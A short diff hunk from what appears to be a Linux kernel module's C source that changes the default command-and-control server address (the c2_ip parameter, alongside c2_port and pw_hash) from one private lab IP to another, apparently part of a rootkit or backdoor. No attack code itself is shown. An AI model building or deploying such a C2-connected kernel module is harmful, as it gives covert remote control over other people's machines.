@@ -34,7 +34,7 @@ MODULE_SOFTDEP("pre: libchacha20poly1305");
 
 static char *pw_hash = "";
 module_param(pw_hash, charp, 0400);
-static char *c2_ip = "192.168.122.96";
+static char *c2_ip = "192.168.122.167";
 static int c2_port = 9999;
 module_param(c2_ip, charp, 0400);
 module_param(c2_port, int, 0400);
